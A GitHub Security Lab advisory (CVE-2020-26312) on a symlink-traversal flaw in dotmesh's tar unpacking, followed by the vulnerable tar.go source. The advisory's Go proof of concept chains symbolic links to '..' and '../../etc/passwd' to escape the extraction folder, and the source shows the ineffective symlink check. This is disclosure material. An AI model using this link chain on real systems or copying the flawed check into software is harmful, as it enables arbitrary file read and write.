=== Content from securitylab.github.com_8f256d7b_20250111_111038.html ===

[skip to content](#content)

 /
[Security Lab](/ "Security Lab")
[Research](https://github.blog/tag/github-security-lab/ "Research")
[Advisories](/advisories/ "Advisories")
[CodeQL Wall of Fame](/codeql-wall-of-fame/ "CodeQL Wall of Fame")
Resources

[Events](/events/ "Events")

[Get Involved](/get-involved/)

* Resources
* [Open Source Community](/open-source "Home")
* [Enterprise](/enterprise "Home")

 /
[Security Lab](/ "Security Lab")

[Research](https://github.blog/tag/github-security-lab/ "Research")
[Advisories](/advisories/ "Advisories")
[CodeQL Wall of Fame](/codeql-wall-of-fame/ "CodeQL Wall of Fame")
Resources

[Open Source Community](/open-source "Open Source Community")
[Enterprise](/enterprise "Enterprise")

[Events](/events/ "Events")
[Get Involved](/get-involved/ "Events")

July 13, 2021
# GHSL-2020-254: Arbitrary file read and/or write in dotmesh - CVE-2020-26312

[![Author avatar](https://avatars.githubusercontent.com/u/61799930)
GitHub Security Lab](https://github.com/ghsecuritylab)

## Coordinated Disclosure Timeline

* 2020-11-30: [Requested security contact](https://github.com/dotmesh-io/dotmesh/issues/806)
* 2021-03-02: Deadline expired
* 2021-07-13: Publishing as per [GitHub SecLab disclosure policy](https://securitylab.github.com/advisories/#policy)

## Summary

The unsafe handling of symbolic links in an unpacking routine may enable attackers to read and/or write to arbitrary locations outside the designated target folder.

## Product

dotmesh

## Tested Version

Latest commit at the time of reporting (November 27, 2020).

## Details

### Unsafe handling of symbolic links in unpacking routine

The routine [`untarFile`](https://github.com/dotmesh-io/dotmesh/blob/master/pkg/archiver/tar.go#L255) attempts to guard against creating symbolic links that point outside the directory a tar archive is extracted to. However, a malicious tarball first linking `subdir/parent` to `..` (allowed, because `subdir/..` falls within the archive root) and then linking `subdir/parent/escapes` to `..` results in a symbolic link pointing to the tarball’s parent directory, contrary to the routine’s goals.

Proof of concept, using a version of `untarFile` tweaked to accept an array of tar headers instead of working from an actual tar archive:

```
package main

import (
	"archive/tar"
	"fmt"
  "os"
	"path/filepath"
	"strings"

	securejoin "github.com/cyphar/filepath-securejoin"
)

func main() {
	var headers []tar.Header = make([]tar.Header, 3)

	headers[0].Name = "subdir/parent"
	headers[0].Linkname = ".."
	headers[0].Typeflag = tar.TypeSymlink

	headers[1].Name = "subdir/parent/passwd"
	headers[1].Linkname = "../../etc/passwd"
	headers[1].Typeflag = tar.TypeSymlink

	headers[2].Name = "subdir/parent/etc"
	headers[2].Linkname = "../../etc"
	headers[2].Typeflag = tar.TypeSymlink

	for _, hdr := range headers {
    to := "/tmp/extracthere"
    destPath, err := securejoin.SecureJoin(to, hdr.Name)
    if err != nil {
      fmt.Println("Insecure path error: %s", err)
      return
    }
	  untarFile(hdr, destPath)
  }

}

func untarFile(hdr tar.Header, to string) error {

	switch hdr.Typeflag {
    case tar.TypeSymlink:
      destPath := filepath.Clean(hdr.Linkname)
      if strings.HasPrefix(destPath, "/") {
        fmt.Errorf("Symlinking to absolute path is insecure: %s", destPath)
      }
      fmt.Println(to, destPath)
      return writeNewSymbolicLink(to, destPath)
    default:
      return fmt.Errorf("%s: unknown type flag: %c", hdr.Name, hdr.Typeflag)
	}
}

func writeNewSymbolicLink(fpath string, target string) error {
	err := os.MkdirAll(filepath.Dir(fpath), 0755)
	if err != nil {
		return fmt.Errorf("%s: making directory for file: %v", fpath, err)
	}

	_, err = os.Lstat(fpath)
	if err == nil {
		err = os.Remove(fpath)
		if err != nil {
			return fmt.Errorf("%s: failed to unlink: %+v", fpath, err)
		}
	}

	err = os.Symlink(target, fpath)
	if err != nil {
		return fmt.Errorf("%s: making symbolic link for: %v", fpath, err)
	}
	return nil
}

```
#### Impact

This issue may lead to arbitrary file write (with same permissions as the program running the unpack operation) if the attacker can control the archive file. Additionally, if the attacker has read access to the unpacked files, he may be able to read arbitrary system files the parent process has permissions to read.

## CVE

* CVE-2020-26312

## Credit

This issue was discovered and reported by GitHub team member [@smowton (Chris Smowton)](https://github.com/smowton).

## Contact

You can contact the GHSL team at `securitylab@github.com`, please include a reference to `GHSL-2020-254` in any communication regarding this issue.

## Product

* [Features](https://github.com/features)
* [Security](https://github.com/security)
* [Team](https://github.com/team)
* [Enterprise](https://github.com/enterprise)
* [Customer stories](https://github.com/customer-stories?type=enterprise)
* [The ReadME Project](https://github.com/readme)
* [Pricing](https://github.com/pricing)
* [Resources](https://resources.github.com)
* [Roadmap](https://github.com/github/roadmap)
* [Compare GitHub](https://resources.github.com/devops/tools/compare/)

## Platform

* [Developer API](https://developer.github.com)
* [Partners](http://partner.github.com/)
* [Atom](https://atom.io)
* [Electron](http://electron.atom.io/)
* [GitHub Desktop](https://desktop.github.com/)

## Support

* [Docs](https://docs.github.com)
* [Community Forum](https://github.community)
* [Professional Services](https://services.github.com/)
* [GitHub Skills](https://skills.github.com/)
* [Status](https://githubstatus.com/)
* [Contact GitHub](https://support.github.com)

## Company

* [About](https://github.com/about)
* [Blog](https://github.blog)
* [Careers](https://github.com/about/careers)
* [Press](https://github.com/about/press)
* [Inclusion](https://github.com/about/careers)
* [Social Impact](https://github.com/about/press)
* [Shop](https://shop.github.com)

* GitHub Inc. ©
  2024
* [Terms](https://docs.github.com/en/github/site-policy/github-terms-of-service)
* [Privacy](https://docs.github.com/en/github/site-policy/github-privacy-statement)
* Sitemap
* [What is Git?](https://github.com/git-guides)
* Manage Cookies
* Do not share my personal information



=== Content from github.com_b6e70366_20250111_111033.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fdotmesh-io%2Fdotmesh%2Fblob%2Fmaster%2Fpkg%2Farchiver%2Ftar.go)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fdotmesh-io%2Fdotmesh%2Fblob%2Fmaster%2Fpkg%2Farchiver%2Ftar.go)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fblob%2Fshow&source=header-repo&source_repo=dotmesh-io%2Fdotmesh)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[dotmesh-io](/dotmesh-io)
/
**[dotmesh](/dotmesh-io/dotmesh)**
Public

* [Notifications](/login?return_to=%2Fdotmesh-io%2Fdotmesh) You must be signed in to change notification settings
* [Fork
  29](/login?return_to=%2Fdotmesh-io%2Fdotmesh)
* [Star
   539](/login?return_to=%2Fdotmesh-io%2Fdotmesh)

* [Code](/dotmesh-io/dotmesh)
* [Issues
  218](/dotmesh-io/dotmesh/issues)
* [Pull requests
  4](/dotmesh-io/dotmesh/pulls)
* [Actions](/dotmesh-io/dotmesh/actions)
* [Projects
  0](/dotmesh-io/dotmesh/projects)
* [Security](/dotmesh-io/dotmesh/security)
* [Insights](/dotmesh-io/dotmesh/pulse)

Additional navigation options

* [Code](/dotmesh-io/dotmesh)
* [Issues](/dotmesh-io/dotmesh/issues)
* [Pull requests](/dotmesh-io/dotmesh/pulls)
* [Actions](/dotmesh-io/dotmesh/actions)
* [Projects](/dotmesh-io/dotmesh/projects)
* [Security](/dotmesh-io/dotmesh/security)
* [Insights](/dotmesh-io/dotmesh/pulse)

## Files

 master
## Breadcrumbs

1. [dotmesh](/dotmesh-io/dotmesh/tree/master)
2. /[pkg](/dotmesh-io/dotmesh/tree/master/pkg)
3. /[archiver](/dotmesh-io/dotmesh/tree/master/pkg/archiver)
/
# tar.go

Copy path Blame  Blame
## Latest commit

## History

[History](/dotmesh-io/dotmesh/commits/master/pkg/archiver/tar.go)532 lines (466 loc) · 13.3 KB master
## Breadcrumbs

1. [dotmesh](/dotmesh-io/dotmesh/tree/master)
2. /[pkg](/dotmesh-io/dotmesh/tree/master/pkg)
3. /[archiver](/dotmesh-io/dotmesh/tree/master/pkg/archiver)
/
# tar.go

Top
## File metadata and controls

* Code
* Blame

532 lines (466 loc) · 13.3 KB[Raw](https://github.com/dotmesh-io/dotmesh/raw/refs/heads/master/pkg/archiver/tar.go)123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324325326327328329330331332333334335336337338339340341342343344345346347348349350351352353354355356357358359360361362363364365366367368369370371372373374375376377378379380381382383384385386387388389390391392393394395396397398399400401402403404405406407408409410411412413414415416417418419420421422423424425426427428429430431432433434435436437438439440441442443444445446447448449450451452453454455456457458459460461462463464465466467468469470471472473474475476477478479480481482483484485486487488489490491492493494495496497498499500501502503504505506507508509510511512513514515516517518519520521522523524525526527528529530531532// package archive is heavily inspired by https://github.com/mholt/archiver/blob/master/tar.go (License MIT)// just with an addition to archive directly to a given writer and removal of unused// functionalitypackage archiver
import ( "archive/tar" "fmt" "io" "log" "os" "path/filepath" "strings"
 securejoin "github.com/cyphar/filepath-securejoin")
// Tar provides facilities for operating TAR archives.// See http://www.gnu.org/software/tar/manual/html\_node/Standard.html.type Tar struct { // Whether to overwrite existing files; if false, // an error is returned if the file exists. OverwriteExisting bool
 // Whether to make all the directories necessary // to create a tar archive in the desired path. MkdirAll bool
 // A single top-level folder can be implicitly // created by the Archive or Unarchive methods // if the files to be added to the archive // or the files to be extracted from the archive // do not all have a common root. This roughly // mimics the behavior of archival tools integrated // into OS file browsers which create a subfolder // to avoid unexpectedly littering the destination // folder with potentially many files, causing a // problematic cleanup/organization situation. // This feature is available for both creation // and extraction of archives, but may be slightly // inefficient with lots and lots of files, // especially on extraction. ImplicitTopLevelFolder bool
 // If true, errors encountered during reading // or writing a single file will be logged and // the operation will continue on remaining files. ContinueOnError bool
 tw \*tar.Writer tr \*tar.Reader
 readerWrapFn func(io.Reader) (io.Reader, error) writerWrapFn func(io.Writer) (io.Writer, error) cleanupWrapFn func()
 destination string}
func (t \*Tar) ArchiveToStream(output io.Writer, sources []string) error { err := t.Create(output) if err != nil { return fmt.Errorf("creating tar: %v", err) } defer t.Close()
 return t.archive(sources)}
func (t \*Tar) archive(sources []string) error { var topLevelFolder string if t.ImplicitTopLevelFolder && multipleTopLevels(sources) { topLevelFolder = folderNameFromFileName(t.destination) }
 for \_, source := range sources { err := t.writeWalk(source, topLevelFolder, t.destination) if err != nil { return fmt.Errorf("walking %s: %v", source, err) } }
 return nil}
// CheckExt ensures the file extension matches the format.func (\*Tar) CheckExt(filename string) error { if !strings.HasSuffix(filename, ".tar") { return fmt.Errorf("filename must have a .tar extension") } return nil}
// Archive creates a tarball file at destination containing// the files listed in sources. The destination must end with// ".tar". File paths can be those of regular files or// directories; directories will be recursively added.func (t \*Tar) Archive(sources []string, destination string) error { err := t.CheckExt(destination) if t.writerWrapFn == nil && err != nil { return fmt.Errorf("checking extension: %v", err) } if !t.OverwriteExisting && fileExists(destination) { return fmt.Errorf("file already exists: %s", destination) }
 // make the folder to contain the resulting archive // if it does not already exist destDir := filepath.Dir(destination) if t.MkdirAll && !fileExists(destDir) { err := mkdir(destDir, 0755) if err != nil { return fmt.Errorf("making folder for destination: %v", err) } }
 out, err := os.Create(destination) if err != nil { return fmt.Errorf("creating %s: %v", destination, err) } defer out.Close()
 err = t.Create(out) if err != nil { return fmt.Errorf("creating tar: %v", err) } defer t.Close()
 var topLevelFolder string if t.ImplicitTopLevelFolder && multipleTopLevels(sources) { topLevelFolder = folderNameFromFileName(destination) }
 for \_, source := range sources { err := t.writeWalk(source, topLevelFolder, destination) if err != nil { return fmt.Errorf("walking %s: %v", source, err) } }
 return nil}
// Unarchive unpacks the .tar file at source to destination.// Destination will be treated as a folder name.func (t \*Tar) Unarchive(source, destination string) error { if !fileExists(destination) && t.MkdirAll { err := mkdir(destination, 0755) if err != nil { return fmt.Errorf("preparing destination: %v", err) } }
 // if the files in the archive do not all share a common // root, then make sure we extract to a single subfolder // rather than potentially littering the destination... if t.ImplicitTopLevelFolder { var err error destination, err = t.addTopLevelFolder(source, destination) if err != nil { return fmt.Errorf("scanning source archive: %v", err) } }
 file, err := os.Open(source) if err != nil { return fmt.Errorf("opening source archive: %v", err) } defer file.Close()
 err = t.Open(file, 0) if err != nil { return fmt.Errorf("opening tar archive for reading: %v", err) } defer t.Close()
 for { err := t.untarNext(destination) if err == io.EOF { break } if err != nil { if t.ContinueOnError { log.Printf("[ERROR] Reading file in tar archive: %v", err) continue } return fmt.Errorf("reading file in tar archive: %v", err) } }
 return nil}
// addTopLevelFolder scans the files contained inside// the tarball named sourceArchive and returns a modified// destination if all the files do not share the same// top-level folder.func (t \*Tar) addTopLevelFolder(sourceArchive, destination string) (string, error) { file, err := os.Open(sourceArchive) if err != nil { return "", fmt.Errorf("opening source archive: %v", err) } defer file.Close()
 // if the reader is to be wrapped, ensure we do that now // or we will not be able to read the archive successfully reader := io.Reader(file) if t.readerWrapFn != nil { reader, err = t.readerWrapFn(reader) if err != nil { return "", fmt.Errorf("wrapping reader: %v", err) } } if t.cleanupWrapFn != nil { defer t.cleanupWrapFn() }
 tr := tar.NewReader(reader)
 var files []string for { hdr, err := tr.Next() if err == io.EOF { break } if err != nil { return "", fmt.Errorf("scanning tarball's file listing: %v", err) } files = append(files, hdr.Name) }
 if multipleTopLevels(files) { destination = filepath.Join(destination, folderNameFromFileName(sourceArchive)) }
 return destination, nil}
func (t \*Tar) untarNext(to string) error { f, err := t.Read() if err != nil { return err // don't wrap error; calling loop must break on io.EOF } header, ok := f.Header.(\*tar.Header) if !ok { return fmt.Errorf("expected header to be \*tar.Header but was %T", f.Header) } destPath, err := securejoin.SecureJoin(to, header.Name) if err != nil { return fmt.Errorf("Insecure path error: %s", err) } return t.untarFile(f, destPath)}
func (t \*Tar) untarFile(f File, to string) error { // do not overwrite existing files, if configured if !f.IsDir() && !t.OverwriteExisting && fileExists(to) { return fmt.Errorf("file already exists: %s", to) }
 hdr, ok := f.Header.(\*tar.Header) if !ok { return fmt.Errorf("expected header to be \*tar.Header but was %T", f.Header) }
 switch hdr.Typeflag { case tar.TypeDir: return mkdir(to, f.Mode()) case tar.TypeReg, tar.TypeRegA, tar.TypeChar, tar.TypeBlock, tar.TypeFifo: return writeNewFile(to, f, f.Mode()) case tar.TypeSymlink: destPath := filepath.Clean(hdr.Linkname) if strings.HasPrefix(destPath, "/") { fmt.Errorf("Symlinking to absolute path is insecure: %s", destPath) } return writeNewSymbolicLink(to, destPath) case tar.TypeLink: destPath, err := securejoin.SecureJoin(to, hdr.Linkname) if err != nil { return fmt.Errorf("Insecure path error for hardlink: %s", err) } return writeNewHardLink(to, destPath) case tar.TypeXGlobalHeader: return nil // ignore the pax global header from git-generated tarballs default: return fmt.Errorf("%s: unknown type flag: %c", hdr.Name, hdr.Typeflag) }}
func (t \*Tar) writeWalk(source, topLevelFolder, destination string) error { sourceInfo, err := os.Stat(source) if err != nil { return fmt.Errorf("%s: stat: %v", source, err) } destAbs, err := filepath.Abs(destination) if err != nil { return fmt.Errorf("%s: getting absolute path of destination %s: %v", source, destination, err) }
 return filepath.Walk(source, func(fpath string, info os.FileInfo, err error) error { handleErr := func(err error) error { if t.ContinueOnError { log.Printf("[ERROR] Walking %s: %v", fpath, err) return nil } return err } if err != nil { return handleErr(fmt.Errorf("traversing %s: %v", fpath, err)) } if info == nil { return handleErr(fmt.Errorf("no file info")) }
 // make sure we do not copy our output file into itself fpathAbs, err := filepath.Abs(fpath) if err != nil { return handleErr(fmt.Errorf("%s: getting absolute path: %v", fpath, err)) } if within(fpathAbs, destAbs) { return nil }
 // build the name to be used within the archive nameInArchive, err := makeNameInArchive(sourceInfo, source, topLevelFolder, fpath) if err != nil { return handleErr(err) }
 var file io.ReadCloser if info.Mode().IsRegular() { file, err = os.Open(fpath) if err != nil { return handleErr(fmt.Errorf("%s: opening: %v", fpath, err)) } defer file.Close() } err = t.Write(File{ FileInfo: FileInfo{ FileInfo: info, CustomName: nameInArchive, }, ReadCloser: file, }) if err != nil { return handleErr(fmt.Errorf("%s: writing: %s", fpath, err)) }
 return nil })}
// Create opens t for writing a tar archive to out.func (t \*Tar) Create(out io.Writer) error { if t.tw != nil { return fmt.Errorf("tar archive is already created for writing") }
 // wrapping writers allows us to output // compressed tarballs, for example if t.writerWrapFn != nil { var err error out, err = t.writerWrapFn(out) if err != nil { return fmt.Errorf("wrapping writer: %v", err) } }
 t.tw = tar.NewWriter(out) return nil}
// Write writes f to t, which must have been opened for writing first.func (t \*Tar) Write(f File) error { if t.tw == nil { return fmt.Errorf("tar archive was not created for writing first") } if f.FileInfo == nil { return fmt.Errorf("no file info") } if f.FileInfo.Name() == "" { return fmt.Errorf("missing file name") }
 var linkTarget string if isSymlink(f) { var err error linkTarget, err = os.Readlink(f.Name()) if err != nil { return fmt.Errorf("%s: readlink: %v", f.Name(), err) } }
 hdr, err := tar.FileInfoHeader(f, filepath.ToSlash(linkTarget)) if err != nil { return fmt.Errorf("%s: making header: %v", f.Name(), err) }
 err = t.tw.WriteHeader(hdr) if err != nil { return fmt.Errorf("%s: writing header: %v", hdr.Name, err) }
 if f.IsDir() { return nil // directories have no contents }
 if hdr.Typeflag == tar.TypeReg { if f.ReadCloser == nil { return fmt.Errorf("%s: no way to read file contents", f.Name()) } \_, err := io.Copy(t.tw, f) if err != nil { return fmt.Errorf("%s: copying contents: %v", f.Name(), err) } }
 return nil}
// Open opens t for reading an archive from// in. The size parameter is not used.func (t \*Tar) Open(in io.Reader, size int64) error { if t.tr != nil { return fmt.Errorf("tar archive is already open for reading") } // wrapping readers allows us to open compressed tarballs if t.readerWrapFn != nil { var err error in, err = t.readerWrapFn(in) if err != nil { return fmt.Errorf("wrapping file reader: %v", err) } } t.tr = tar.NewReader(in) return nil}
// Read reads the next file from t, which must have// already been opened for reading. If there are no// more files, the error is io.EOF. The File must// be closed when finished reading from it.func (t \*Tar) Read() (File, error) { if t.tr == nil { return File{}, fmt.Errorf("tar archive is not open") }
 hdr, err := t.tr.Next() if err != nil { return File{}, err // don't wrap error; preserve io.EOF }
 file := File{ FileInfo: hdr.FileInfo(), Header: hdr, ReadCloser: ReadFakeCloser{t.tr}, }
 return file, nil}
// Close closes the tar archive(s) opened by Create and Open.func (t \*Tar) Close() error { var err error if t.tr != nil { t.tr = nil } if t.tw != nil { tw := t.tw t.tw = nil err = tw.Close() } // make sure cleanup of "Reader/Writer wrapper" // (say that ten times fast) happens AFTER the // underlying stream is closed if t.cleanupWrapFn != nil { t.cleanupWrapFn() } return err}
// Walk calls walkFn for each visited item in archive.func (t \*Tar) Walk(archive string, walkFn WalkFunc) error { file, err := os.Open(archive) if err != nil { return fmt.Errorf("opening archive file: %v", err) } defer file.Close()
 err = t.Open(file, 0) if err != nil { return fmt.Errorf("opening archive: %v", err) } defer t.Close()
 for { f, err := t.Read() if err == io.EOF { break } if err != nil { if t.ContinueOnError { log.Printf("[ERROR] Opening next file: %v", err) continue } return fmt.Errorf("opening next file: %v", err) } err = walkFn(f) if err != nil { if err == ErrStopWalk { break } if t.ContinueOnError { log.Printf("[ERROR] Walking %s: %v", f.Name(), err) continue } return fmt.Errorf("walking %s: %v", f.Name(), err) } }
 return nil}
// NewTar returns a new, default instance ready to be customized and used.func NewTar() \*Tar { return &Tar{ MkdirAll: true, }}
// DefaultTar is a default instance that is conveniently ready to use.var DefaultTar = NewTar()

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.


